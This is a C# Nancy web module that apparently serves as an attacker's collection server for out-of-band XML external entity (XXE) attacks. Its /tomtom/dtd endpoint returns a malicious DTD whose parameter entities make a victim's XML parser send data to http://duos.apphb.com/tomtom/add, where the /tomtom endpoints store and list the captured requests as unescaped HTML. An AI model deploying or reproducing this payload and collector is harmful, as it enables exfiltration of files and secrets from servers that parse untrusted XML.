﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Routing;
using Nancy;

namespace DuosWeb
{
    public class MainModule : NancyModule
    {
        public static List<RequestEntry> Data = new List<RequestEntry>();

        public MainModule()
        {
            Get["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };
            Post["/raw"] = _ =>
            {
                return Response.AsText(getRaw());
            };

            Get["/tomtom/add"] = _ =>
            {
                Data.Add(new RequestEntry()
                {
                    Date = DateTime.Now,
                    Info = getRaw()
                });
                return "added";
            };
            Get["/tomtom/list"] = _ =>
            {
                string result = "Now: " + DateTime.Now.ToLongTimeString() + "<br>";
                foreach (var d in Data)
                {
                    result += "<h1>" + d.Date.ToLongTimeString() + "</h1><p>" + d.Info + "<p>";
                }

                return result;
            };
            Get["/tomtom/clear"] = _ =>
            {
                Data.Clear();
                return "cleared";
            };

            Get["/tomtom/dtd"] = _ =>
            {
                return Response.AsText("<!ENTITY % param1 \"<!ENTITY &#37; send SYSTEM 'http://duos.apphb.com/tomtom/add?q=%pwd;'>\"> % param1; ").WithContentType("application/xml");
            };
        }

        string getRaw()
        {
            var dict = ((DynamicDictionary)Request.Query);
            string q = string.Join("&", dict.ToDictionary().Select(x => x.Key + "=" + x.Value));


            string raw = Request.Method + " " + Request.Path + (string.IsNullOrEmpty(q) ? string.Empty : "?" + q) + " " + Request.ProtocolVersion + "<br>";
            raw += Request.UserHostAddress + "<br>";
            foreach (var r in Request.Headers)
            {
                foreach (var v in r.Value)
                    raw += r.Key + ": " + v + "<br>";
            }
            raw += Environment.NewLine;
            
            raw += "<b>Query:</b><br>" + string.Join("&", new RouteValueDictionary(Request.Query).Select(x => x.Key + "=" + x.Value));
            raw += "<br><b>Body:</b><br>" + new System.IO.StreamReader(Request.Body).ReadToEnd();
            return raw;
        }
    }
}